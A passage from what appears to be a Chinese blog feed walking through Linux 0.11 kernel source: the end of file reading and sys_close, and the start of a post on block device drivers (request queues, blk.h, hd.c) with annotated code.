class="line">&#125;</span><br></pre></td></tr></table></figure><p>硬盘对应的请求处理函数 dev-&gt;request_fn 为 do_hd_request，在上一篇文章 <a href="https://in1nit1t.github.io/2020/06/04/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-%E5%9D%97%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8/">块设备驱动</a> 中已经给出注释。add_request 函数将请求添加到队列中后，会返回到 bread 中，执行 <code>wait_on_buffer</code>，等待读请求完成，再返回到 file_read 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fs/file_dev.c Line 30</span></span><br><span class="line">nr = filp-&gt;f_pos % BLOCK_SIZE;<span class="comment">// 计算文件当前读写指针在数据块中的偏移 nr</span></span><br><span class="line">chars = MIN( BLOCK_SIZE-nr , left );<span class="comment">// 获得二者之间较小的值</span></span><br><span class="line">filp-&gt;f_pos += chars;<span class="comment">// 设置文件当前读写指针</span></span><br><span class="line">left -= chars;<span class="comment">// 剩余未读字符数减去将拷贝字符数</span></span><br><span class="line"><span class="keyword">if</span> (bh) &#123;</span><br><span class="line"><span class="keyword">char</span> * p = nr + bh-&gt;b_data;</span><br><span class="line"><span class="keyword">while</span> (chars--&gt;<span class="number">0</span>)<span class="comment">// buf 为 read 第二个参数</span></span><br><span class="line">put_fs_byte(*(p++),buf++);<span class="comment">// 将高速缓冲块中的数据拷贝到目标地址处</span></span><br><span class="line">brelse(bh);<span class="comment">// 释放缓冲头</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;<span class="comment">// 如果上面 bread 失败，bh 为 NULL，则将 buf 填 0</span></span><br><span class="line"><span class="keyword">while</span> (chars--&gt;<span class="number">0</span>)</span><br><span class="line">put_fs_byte(<span class="number">0</span>,buf++);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">inode-&gt;i_atime = CURRENT_TIME;<span class="comment">// 设置 i 节点访问时间为当前时间</span></span><br><span class="line"><span class="keyword">return</span> (count-left)?(count-left):-ERROR;<span class="comment">// 返回读到 buf 的字符数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，”/usr/root/hello.c” 文件的内容已经被读入 msg 中，最后是文件的关闭</p><br><h3 id="close"><a href="#close" class="headerlink" title="close"></a>close</h3><p>close 系统调用就比较简单了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fs/open.c Line 192</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_close</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">filp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fd &gt;= NR_OPEN)<span class="comment">// 判断参数的合法性</span></span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">current-&gt;close_on_exec &amp;= ~(<span class="number">1</span>&lt;&lt;fd);<span class="comment">// 复位执行时关闭位图中对应的位</span></span><br><span class="line"><span class="keyword">if</span> (!(filp = current-&gt;filp[fd]))<span class="comment">// 如果该文件句柄不存在，返回错误码</span></span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">current-&gt;filp[fd] = <span class="literal">NULL</span>;<span class="comment">// 将 filp 数组该项置空</span></span><br><span class="line"><span class="keyword">if</span> (filp-&gt;f_count == <span class="number">0</span>)<span class="comment">// 如果句柄引用计数已经为 0，说明内核出现错误，停机</span></span><br><span class="line">panic(<span class="string">&quot;Close: file count is 0&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (--filp-&gt;f_count)<span class="comment">// 否则将引用计数减一</span></span><br><span class="line"><span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">iput(filp-&gt;f_inode);<span class="comment">// 放回该 i 节点</span></span><br><span class="line"><span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p>呼~ 这个系列到此结束啦✿✿ヽ(°▽°)ノ✿，后面也许会搞点内核 pwn，到时候再做记录，收工收工</p>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> Linux0.11 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核源码阅读-块设备驱动</title>
      <link href="/2020/06/04/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-%E5%9D%97%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8/"/>
      <url>/2020/06/04/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-%E5%9D%97%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<p>开始 fs 模块之前，我发现如果对<strong>块设备/字符设备</strong>的驱动程序不了解的话，读 fs 代码时会困难重重。为了简化问题，本文及之后的 fs 模块都将只记录关于<strong>块设备(特指硬盘)</strong>的代码，先弄懂一个，剩下的读起来就轻松了。阅读本文或许会一头雾水，但和下篇文章联系起来看就会清楚许多了（x</p><h2 id="块设备操作方式（以读数据为例）"><a href="#块设备操作方式（以读数据为例）" class="headerlink" title="块设备操作方式（以读数据为例）"></a>块设备操作方式（以读数据为例）</h2><p>提到 I/O 先来看一张图：</p><p><img src="../img/c1.png" alt="块设备操作方式"></p><p>当程序需要从硬盘中读取数据（read 系统调用）时，缓冲区管理程序会先查询该数据块是否已经读入到缓冲区中。如果是，则直接将该<strong>缓冲头</strong>（涉及高速缓冲的管理方式，下篇文章将会记录）返回并唤醒等待此数据块的进程；否则调用 ll_rw_block 函数，告诉块<strong>设备驱动程序</strong>（内核代码）现在需要读数据块，该函数就会为其创建一个请求项，并挂入相应设备的请求队列，同时发出请求的进程会被挂起（不可中断睡眠态）。</p><p>当请求被处理时，<strong>设备控制器</strong>根据请求项中的参数，向<strong>硬盘驱动器</strong>发送读指令，<strong>硬盘驱动器</strong>就会将数据读取到<strong>设备控制器的缓冲区</strong>中（注意此时原发出读盘请求的进程已被挂起，CPU 正在被其他进程占用）。当<strong>设备控制器</strong>检测到数据读取完毕，就会产生一个中断请求信号发往 CPU，CPU 在硬盘中断处理程序 hd_interrupt 中调用 read_intr 函数将数据从<strong>设备控制器的缓冲区</strong>搬到<strong>内存的高速缓冲区</strong>中，并让设备控制器开始处理下一个请求（如果有的话）。最后内核将高速缓冲中的数据拷贝到调用 read 函数时第二个参数指向的地址中去。用一张图来总结：</p><p><img src="../img/c2.png" alt="块设备操作方式"></p><br><h2 id="请求项与请求队列"><a href="#请求项与请求队列" class="headerlink" title="请求项与请求队列"></a>请求项与请求队列</h2><blockquote><p>请求项</p></blockquote><p>请求项的数据结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/blk_drv/blk.h Line 23</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">request</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> dev;<span class="comment">// 使用的设备号，为 -1 表示该请求项空闲</span></span><br><span class="line"><span class="keyword">int</span> cmd;<span class="comment">// 表示该请求项的操作是读还是写</span></span><br><span class="line"><span class="keyword">int</span> errors;<span class="comment">// 操作时产生的错误次数</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sector;<span class="comment">// 开始扇区</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> nr_sectors;<span class="comment">// 读/写 扇区数量</span></span><br><span class="line"><span class="keyword">char</span> * buffer;<span class="comment">// 指向高速缓冲区，数据会从设备控制器的缓冲区搬到这里来</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> * <span class="title">waiting</span>;</span><span class="comment">// 等待该请求完成的任务</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">bh</span>;</span><span class="comment">// 缓冲区头指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">request</span> * <span class="title">next</span>;</span><span class="comment">// 指向下一个请求项</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ll_rw_blk.c Line 21</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">request</span> <span class="title">request</span>[<span class="title">NR_REQUEST</span>];</span><span class="comment">// 请求项数组，NR_REQUEST 值为 32</span></span><br></pre></td></tr></table></figure><p>为什么请求项已经可以通过 next 指针构成单项链表了，还需要一个数组来维护呢？采用数组加链表结构其实是为了满足两个目的：</p><ul><li>数组结构使得在搜索空闲请求项的时候可以进行循环操作，搜索访问时间复杂度为常数</li><li>链表结构是为了满足电梯算法插入请求项的操作</li></ul><br><blockquote><p>请求队列</p></blockquote><p>对于各种块设备，内核使用块设备表 blk_dev 来管理，每种块设备在块设备表中占有一项，相关数据结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// blk.h Line 45</span></span><br><span class="line"><span class="comment">// 块设备表项</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">blk_dev_struct</span> &#123;</span></span><br><span class="line"><span class="keyword">void</span> (*request_fn)(<span class="keyword">void</span>);<span class="comment">// 处理请求项的函数指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">request</span> * <span class="title">current_request</span>;</span><span class="comment">// 该设备当前请求队列头指针</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ll_rw_blk.c Line 32</span></span><br><span class="line"><span class="comment">// 初始化块设备表，NR_BLK_DEV 值为 7，以设备的主设备号为索引</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">blk_dev_struct</span> <span class="title">blk_dev</span>[<span class="title">NR_BLK_DEV</span>] =</span> &#123;</span><br><span class="line">&#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;,<span class="comment">// 无</span></span><br><span class="line">&#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;,<span class="comment">// 虚拟盘，对应的请求处理函数为 do_rd_request</span></span><br><span class="line">&#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;,<span class="comment">// 软盘，对应的请求处理函数为 do_fd_request</span></span><br><span class="line">&#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;,<span class="comment">// 硬盘，对应的请求处理函数为 do_hd_request</span></span><br><span class="line">&#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;,<span class="comment">// 无用</span></span><br><span class="line">&#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;,<span class="comment">// 无用</span></span><br><span class="line">&#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;<span class="comment">// 无用</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br><p>再来通过一张图直观地感受这些数据结构之间的关系：</p><p><img src="../img/q1.png" alt="请求项与请求队列"></p><p>通过之前的描述不难看出，硬盘设备有 4 个请求，软盘设备有 1 个请求，虚拟盘暂无请求。下面正式开始块设备（仅硬盘）驱动程序部分源码的阅读</p><br><h2 id="blk-h"><a href="#blk-h" class="headerlink" title="blk.h"></a>blk.h</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _BLK_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _BLK_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NR_BLK_DEV7<span class="comment">// 块设备类型数量</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NR_REQUEST32<span class="comment">// 请求项数组长度</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">request</span> &#123;</span><span class="comment">// 请求项结构体，上面已经提及</span></span><br><span class="line"><span class="keyword">int</span> dev;</span><br><span class="line"><span class="keyword">int</span> cmd;</span><br><span class="line"><span class="keyword">int</span> errors;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sector;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> nr_sectors;</span><br><span class="line"><span class="keyword">char</span> * buffer;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> * <span class="title">waiting</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">bh</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">request</span> * <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 单项电梯算法对插入请求队列的请求项进行排序，将请求项插入到磁头移动距离最小的位置处</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IN_ORDER(s1,s2) \</span></span><br><span class="line"><span class="meta">((s1)-&gt;cmd<span class="meta-string">&lt;(s2)-&gt;</span>cmd || (s1)-&gt;cmd==(s2)-&gt;cmd &amp;&amp; \</span></span><br><span class="line"><span class="meta">((s1)-&gt;dev <span class="meta-string">&lt; (s2)-&gt;</span>dev || ((s1)-&gt;dev == (s2)-&gt;dev &amp;&amp; \</span></span><br><span class="line"><span class="meta">(s1)-&gt;sector <span class="meta-string">&lt; (s2)-&gt;</span>sector)))</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">blk_dev_struct</span> &#123;</span><span class="comment">// 设备表项结构体，上面已经提及</span></span><br><span class="line"><span class="keyword">void</span> (*request_fn)(<span class="keyword">void</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">request</span> * <span class="title">current_request</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">blk_dev_struct</span> <span class="title">blk_dev</span>[<span class="title">NR_BLK_DEV</span>];</span><span class="comment">// 设备表</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">request</span> <span class="title">request</span>[<span class="title">NR_REQUEST</span>];</span><span class="comment">// 请求项数组</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> * <span class="title">wait_for_request</span>;</span><span class="comment">// 等待空闲请求项的进程队列头指针</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> MAJOR_NR</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> (MAJOR_NR == 3)<span class="comment">// 如果主设备号是 3，即硬盘</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_NAME <span class="meta-string">&quot;harddisk&quot;</span><span class="comment">// 设备名称</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_INTR do_hd<span class="comment">// 设备中断处理函数</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_REQUEST do_hd_request<span class="comment">// 设备请求项处理函数</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_NR(device) (MINOR(device)/5)<span class="comment">// 硬盘设备号(0 - 1)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_ON(device)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_OFF(device)<span class="comment">// 开机后硬盘总是运转</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> (MAJOR_NR &gt; 3)<span class="comment">// 主设备号大于 3</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">error</span> <span class="meta-string">&quot;unknown blk device&quot;</span><span class="comment">// 未知块设备</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CURRENT (blk_dev[MAJOR_NR].current_request)<span class="comment">// 指定设备号的当前请求项指针</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CURRENT_DEV DEVICE_NR(CURRENT-&gt;dev)<span class="comment">// 当前请求项的设备号</span></span></span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEVICE_INTR<span class="comment">// 如果定义了设备中断处理符号常数</span></span></span><br><span class="line"><span class="keyword">void</span> (*DEVICE_INTR)(<span class="keyword">void</span>) = <span class="literal">NULL</span>;<span class="comment">// 将其声明为一个值为 NULL 的函数指针</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">void</span> <span class="params">(DEVICE_REQUEST)</span><span class="params">(<span class="keyword">void</span>)</span></span>;<span class="comment">// 将符号常数 DEVICE_REQUEST 声明为一个静态函数指针</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 解锁指定缓冲块，参数是该缓冲块的缓冲块头指针</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">unlock_buffer</span><span class="params">(struct buffer_head * bh)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!bh-&gt;b_lock)<span class="comment">// 如果已经处于解锁状态，发出警告</span></span><br><span class="line">printk(DEVICE_NAME <span class="string">&quot;: free buffer being unlocked\n&quot;</span>);</span><br><span class="line">bh-&gt;b_lock=<span class="number">0</span>;<span class="comment">// 解锁</span></span><br><span class="line">wake_up(&amp;bh-&gt;b_wait);<span class="comment">// 唤醒等待该缓冲块的进程</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结束请求，参数用于设置缓冲块数据更新标志</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">end_request</span><span class="params">(<span class="keyword">int</span> uptodate)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DEVICE_OFF(CURRENT-&gt;dev);<span class="comment">// 关闭设备</span></span><br><span class="line"><span class="keyword">if</span> (CURRENT-&gt;bh) &#123;<span class="comment">// 如果当前请求项的缓冲块头指针不为空</span></span><br><span class="line">CURRENT-&gt;bh-&gt;b_uptodate = uptodate;<span class="comment">// 设置数据更新标志</span></span><br><span class="line">unlock_buffer(CURRENT-&gt;bh);<span class="comment">// 解锁缓冲块</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!uptodate) &#123;<span class="comment">// 如果参数给定的更新标志为 0，则显示出错信息</span></span><br><span class="line">printk(DEVICE_NAME <span class="string">&quot; I/O error\n\r&quot;</span>);</span><br><span class="line">printk(<span class="string">&quot;dev %04x, block %d\n\r&quot;</span>,CURRENT-&gt;dev,</span><br><span class="line">CURRENT-&gt;bh-&gt;b_blocknr);</span><br><span class="line">&#125;</span><br><span class="line">wake_up(&amp;CURRENT-&gt;waiting);<span class="comment">// 唤醒等待该请求项完成的进程</span></span><br><span class="line">wake_up(&amp;wait_for_request);<span class="comment">// 唤醒等待空闲请求项的进程</span></span><br><span class="line">CURRENT-&gt;dev = <span class="number">-1</span>;<span class="comment">// 设置当前请求项空闲</span></span><br><span class="line">CURRENT = CURRENT-&gt;next;<span class="comment">// 指向下一请求项</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_REQUEST \<span class="comment">// 初始化请求项</span></span></span><br><span class="line">repeat: \</span><br><span class="line"><span class="keyword">if</span> (!CURRENT) \<span class="comment">// 如果没有请求项，则返回</span></span><br><span class="line"><span class="keyword">return</span>; \</span><br><span class="line"><span class="keyword">if</span> (MAJOR(CURRENT-&gt;dev) != MAJOR_NR) \<span class="comment">// 如果当前设备主设备号不对则停机</span></span><br><span class="line">panic(DEVICE_NAME <span class="string">&quot;: request list destroyed&quot;</span>); \</span><br><span class="line"><span class="keyword">if</span> (CURRENT-&gt;bh) &#123; \<span class="comment">// 如果缓冲块头指针不为空</span></span><br><span class="line"><span class="keyword">if</span> (!CURRENT-&gt;bh-&gt;b_lock) \<span class="comment">// 且没有被锁定</span></span><br><span class="line">panic(DEVICE_NAME <span class="string">&quot;: block not locked&quot;</span>); \<span class="comment">// 停机</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><br><h2 id="hd-c"><a href="#hd-c" class="headerlink" title="hd.c"></a>hd.c</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/config.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/hdreg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/system.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/segment.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAJOR_NR 3<span class="comment">// 定义主设备号为 3，即硬盘</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;blk.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMOS_READ(addr) (&#123; \<span class="comment">// 读 CMOS 参数</span></span></span><br><span class="line">outb_p(<span class="number">0x80</span>|addr,<span class="number">0x70</span>); \<span class="comment">// 0x80 | addr 是要读的 CMOS 内存地址，0x70 是写端口号</span></span><br><span class="line">inb_p(<span class="number">0x71</span>); \<span class="comment">// 0x71 是读端口号</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ERRORS7<span class="comment">// 读/写 一个扇区时允许的最多出错次数</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_HD2<span class="comment">// 系统支持的最多硬盘数</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">recal_intr</span><span class="params">(<span class="keyword">void</span>)</span></span>;<span class="comment">// 重新校正处理函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> recalibrate = <span class="number">0</span>;<span class="comment">// 重新校正标志，设置为 1 时，程序会调用 recal_intr</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> reset = <span class="number">0</span>;<span class="comment">// 复位标志，当发生读写错误时会设置该标志并调用相关复位函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 硬盘信息结构体</span></span><br><span class="line"><span class="comment">// 包括磁头数、每磁道扇区数、柱面数、写前预补偿柱面号，磁头着陆区柱面号、控制字节</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hd_i_struct</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> head,sect,cyl,wpcom,lzone,ctl;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果在 include/linux/config.h 中已经定义了 HD_TYPE，就取定义好的参数</span></span><br><span class="line"><span class="comment">// 作为硬盘信息数组 hd_info 中的数据，否则填充为 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HD_TYPE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hd_i_struct</span> <span class="title">hd_info</span>[] =</span> &#123; HD_TYPE &#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NR_HD ((sizeof (hd_info))/(sizeof (struct hd_i_struct)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hd_i_struct</span> <span class="title">hd_info</span>[] =</span> &#123; 